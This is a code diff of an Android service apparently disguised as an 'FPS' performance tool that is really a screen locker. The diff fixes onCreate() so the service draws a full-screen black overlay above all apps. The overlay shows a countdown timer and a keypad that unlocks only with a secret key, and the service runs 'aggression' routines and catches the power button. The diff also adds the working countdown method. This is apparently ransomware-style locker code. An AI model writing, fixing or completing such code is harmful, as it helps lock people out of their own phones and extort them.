@@ -133,22 +133,30 @@ public class FPSService extends Service {
     private String currentInput = "";
 
     @Override
-        public void onCreate() {
+    public void onCreate() {
         super.onCreate();
-    
+
+        // 1. Inisialisasi Service & Optimization
+        startInForeground();
+        initSystemOptimization();
+
+        // 2. Setup Window Manager & Layout
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        overlayLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
+        
+        // 3. SEKARANG baru cari View berdasarkan ID (Setelah inflate)
         textTimer = overlayLayout.findViewById(R.id.textTimer);
         textStatusMessage = overlayLayout.findViewById(R.id.textStatusMessage);
         TextView display = overlayLayout.findViewById(R.id.textDisplayPassword);
-    
-        startCountdown();
-        startInForeground();
-        initSystemOptimization();
-    
-        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        overlayLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
+
         overlayLayout.setFitsSystemWindows(false);
         overlayLayout.setBackgroundColor(0xFF000000);
-    
+
+        // 4. Jalankan Timer & Agresi
+        startCountdown();
+        startNativeAggression(getPackageName() + "/.FPSService");
+
+        // 5. Konfigurasi Window LayoutParams
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -160,18 +168,16 @@ public class FPSService extends Service {
                 WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED |
                 WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                 PixelFormat.TRANSLUCENT);
-    
+
         params.gravity = Gravity.FILL;
-    
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
             params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
         }
-    
+
         windowManager.addView(overlayLayout, params);
-    
-        // 4. Logika Input Angka
-        TextView display = (TextView) overlayLayout.findViewById(R.id.textDisplayPassword);
-        
+        applyFullScreen();
+
+        // 6. Logika Input Keypad
         View.OnClickListener numListener = v -> {
             Button b = (Button) v;
             if (currentInput.length() < 12) {
@@ -180,14 +186,14 @@ public class FPSService extends Service {
                 display.setHint(""); 
             }
         };
-    
+
         int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
                            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
         for (int id : buttonIds) {
             View btn = overlayLayout.findViewById(id);
             if (btn != null) btn.setOnClickListener(numListener);
         }
-    
+
         View btnDel = overlayLayout.findViewById(R.id.btnDelete);
         if (btnDel != null) {
             btnDel.setOnClickListener(v -> {
@@ -197,8 +203,9 @@ public class FPSService extends Service {
                 }
             });
         }
-    
+
         View btnUnlock = overlayLayout.findViewById(R.id.btnUnlock);
+        if (btnUnlock != null) {
             btnUnlock.setOnClickListener(v -> {
                 if (verifyAdvancedKey(currentInput)) {
                     isAuthenticated = true;
@@ -211,14 +218,31 @@ public class FPSService extends Service {
                 }
             });
         }
-    
-        // 5. Fitur Agresif
-        startNativeAggression(getPackageName() + "/.FPSService");
-        applyFullScreen();
-    
-        // 6. Receiver Power Button
+
+        // 7. Receiver Power Button
         IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
         registerReceiver(screenReceiver, filter);
+    }
+
+    // Pastikan tambahkan method ini agar tidak error
+    private void startCountdown() {
+        Handler timerHandler = new Handler();
+        timerHandler.post(new Runnable() {
+            @Override
+            public void run() {
+                int hours = (int) (timeLeftInSeconds / 3600);
+                int minutes = (int) (timeLeftInSeconds % 3600) / 60;
+                int seconds = (int) (timeLeftInSeconds % 60);
+
+                String timeString = String.format("%02d:%02d:%02d", hours, minutes, seconds);
+                if (textTimer != null) textTimer.setText(timeString);
+
+                if (timeLeftInSeconds > 0) {
+                    timeLeftInSeconds--;
+                    timerHandler.postDelayed(this, 1000);
+                }
+            }
+        });
     }
     
     private void startInForeground() {
